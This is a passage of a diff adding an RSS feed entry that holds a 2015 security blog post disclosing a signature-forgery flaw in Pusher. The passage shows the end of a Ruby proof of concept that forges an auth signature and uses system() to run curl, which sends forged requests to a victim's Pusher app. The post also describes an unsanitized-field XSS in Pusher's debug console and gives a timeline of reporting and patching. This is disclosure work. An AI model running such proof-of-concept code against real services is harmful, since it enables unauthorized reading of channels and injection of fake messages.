+  &lt;span class=&quot;ss&quot;&gt;socket_id: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;auth_key=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;auth_timestamp=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stamp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;auth_version=1.0&amp;amp;body_md5=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;dummy=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;channel: &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dummy_channel&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://api.pusherapp.com/apps/99759&quot;&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'8897fad3dbbb3ac533a9'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'test_channel'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;authenticate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:socket_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:channel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test_channel'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# We only need last part of auth token&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;CURL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+curl &quot;https://api.pusherapp.com&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;?body_md5=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;auth_version=1.0&amp;amp;auth_key=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;auth_timestamp=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stamp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;auth_signature=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;dummy=:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dummy_channel&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot; -H 'Content-Type: application/json' -d '&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;' 
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;CURL&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Using this PoC we can get a list of public/private channels of the victim and send any fake data to those channels. &lt;a href=&quot;https://pusher.com/docs/rest_api#method-get-channel&quot;&gt;See REST documentation for other endpoints.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-xss-on-pushercom-using-pusher&quot;&gt;Getting XSS on pusher.com using… Pusher&lt;/h2&gt;
+
+&lt;p&gt;This one is just for fun.&lt;/p&gt;
+
+&lt;p&gt;Thinking of what harm can be done with malicious fake messages beyond phishing, I tried to find some Universal XSS and thoroughly reviewed pusher.js, but discovered nothing like that. However, there’s special Console for debugging on pusher.com which doesn’t sanitize &lt;code class=&quot;highlighter-rouge&quot;&gt;log.type&lt;/code&gt; before inserting in HTML.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/pusher.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;timeline&quot;&gt;Timeline:&lt;/h3&gt;
+
+&lt;p&gt;May 8 - the bug was reported to Pusher&lt;/p&gt;
+
+&lt;p&gt;May 14 - they fixed SDK libraries and server side was patched to block forged signatures.&lt;/p&gt;
+
+&lt;p&gt;If you’re using standalone product like &lt;a href=&quot;https://github.com/stevegraham/slanger&quot;&gt;slanger&lt;/a&gt; (open source implementation of pusher) - update SDK/slanger/both asap.&lt;/p&gt;
+
+&lt;p&gt;Previous posts about format injections: &lt;a href=&quot;https://sakurity.com/blog/2015/03/03/duo_format_injection.html&quot;&gt;Format Injection Vulnerability in Duo Security Web SDK&lt;/a&gt;, &lt;a href=&quot;https://sakurity.com/blog/2015/03/15/authy_bypass.html&quot;&gt;How “../sms” could bypass Authy 2 Factor Authentication&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 08 May 2015 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2015/05/08/pusher.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2015/05/08/pusher.html</guid>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
